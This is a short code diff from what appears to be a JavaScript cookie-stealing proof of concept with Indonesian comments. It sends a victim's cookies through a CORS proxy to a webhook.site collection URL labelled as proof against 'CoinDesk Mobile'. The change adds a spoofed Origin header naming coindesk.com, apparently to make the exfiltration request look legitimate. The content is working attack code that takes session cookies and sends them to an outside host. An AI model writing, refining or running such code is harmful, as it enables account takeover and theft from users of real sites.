@@ -12,7 +12,7 @@ document.getElementById('output').textContent = `Cookie dicuri: ${cookies || '(k
 // Opsi 1: Via Proxy
 fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/590ea786-c800-4823-b014-deec262c943e', {
   method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
+  headers: { 'Content-Type': 'application/json', 'Origin': 'https://coindesk.com' },
   body: JSON.stringify({ cookies: cookies, proof: 'CoinDesk Mobile' })
 }).then(() => alert('Berhasil! Cek webhook.site'));
 
